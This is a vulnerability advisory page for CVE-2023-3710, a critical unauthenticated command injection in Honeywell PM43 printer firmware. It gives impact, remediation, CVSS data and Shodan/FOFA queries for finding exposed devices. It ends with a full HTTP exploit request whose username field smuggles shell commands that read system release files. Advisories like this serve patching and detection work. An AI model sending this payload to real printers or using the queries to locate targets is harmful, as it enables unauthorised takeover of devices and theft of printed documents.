---
layout: "post"
cve_id: "CVE-2023-3710"
title: "Honeywell PM43 Printers - Command Injection"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-3710.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-3710.yaml"
author: "win3zz"
severity: "critical"
impact: "Unauthenticated attackers can execute arbitrary operating system commands through the username parameter in loadfile.lp, potentially gaining full control of Honeywell PM43 printers and intercepting print jobs containing sensitive documents.
"
remediation: "Update Honeywell PM43 printer firmware to version P10.19.050004 (MR19.5) or later that properly sanitizes input in loadfile.lp and prevents command injection attacks.
"
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-3710"
  - "https://github.com/vpxuser/CVE-2023-3710-POC"
  - "https://twitter.com/win3zz/status/1713451282344853634"
  - "https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004"
  - "https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwarexasignedP1019050004A"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-3710', 'cwe-id': 'CWE-77,CWE-20', 'epss-score': 0.91703, 'epss-percentile': 0.99663, 'cpe': 'cpe:2.3:o:honeywell:pm43_firmware:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'honeywell', 'product': 'pm43_firmware', 'shodan-query': 'http.html:"/main/login.lua?pageid="', 'fofa-query': 'body="/main/login.lua?pageid="'}"
tags:
  - "cve2023"
  - "cve"
  - "honeywell"
  - "pm43"
  - "printer"
  - "iot"
  - "rce"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Improper Input Validation vulnerability in Honeywell PM43 on 32 bit, ARM (Printer web page modules) allows Command Injection.This issue affects PM43 versions prior to P10.19.050004. Update to the latest available firmware version of the respective printers to version MR19.5 (e.g. P10.19.050006)


## üåê HTTP Request
```nohighlight
POST /loadfile.lp?pageid=Configure HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=x%0aid;pwd;cat+/etc/*-release%0a&userpassword=1
```

